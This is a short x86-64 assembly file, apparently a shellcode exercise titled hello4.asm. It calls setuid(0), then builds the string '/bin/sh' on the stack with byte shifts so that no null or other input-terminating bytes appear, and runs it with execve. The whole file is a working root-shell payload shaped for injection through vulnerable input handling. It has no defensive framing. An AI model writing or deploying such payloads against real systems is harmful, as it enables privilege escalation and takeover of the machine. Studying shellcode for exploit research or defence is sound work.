;hello4.asm  attempts to get rid of all input terminating
; characters

section .text

global _start

_start:
;set-uid root systemcall 
xor rdi, rdi
mov al,105
syscall
;clear out the registers we are going to need
xor rax, rax
xor rdi, rdi
xor rsi, rsi
xor rdx, rdx
xor rcx, rcx

;load modded path to a register
mov dword ecx, 0x68732fff
;right shift by 1 byte to produce a null terminator
shr ecx, 8 
;push / b i n to stack
push 0x6e69622f
;push / s h 0 to stack
mov dword [rsp+4], ecx

;execve -> rax(path -> rdi, args -> rsi, envp -> rdx)
mov al,59
mov rdi, rsp
syscall
